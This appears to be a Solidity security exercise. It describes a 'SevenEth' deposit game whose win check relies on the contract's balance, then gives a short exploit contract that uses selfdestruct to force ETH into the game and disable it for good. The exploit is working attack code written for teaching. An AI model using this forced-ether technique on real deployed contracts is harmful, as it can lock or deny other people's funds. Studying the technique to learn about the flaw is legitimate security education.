/*
Become the 7th person to deposit 1 ETH to win 7 ETH.

You can deposit 1 ETH at a time.

Alice and Bob already has 1 ETH deposited.

contract SevenEth {
    function play() external payable {
        require(msg.value == 1 ether, "not 1 ether");

        uint bal = address(this).balance;
        require(bal <= 7 ether, "game over");

        if (bal == 7 ether) {
            payable(msg.sender).transfer(7 ether);
        }
    }
}


Task:
    - Disable the game so that no one can win 7 ETH. 10 ETH will be sent to pwn.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SevenEthExploit {
    address payable target;

    constructor(address payable _target) {
        target = _target;
    }

    function pwn() external payable {
        // write your code here
        // force send all of ETH stored in this contracts
        selfdestruct(target);
    }
}


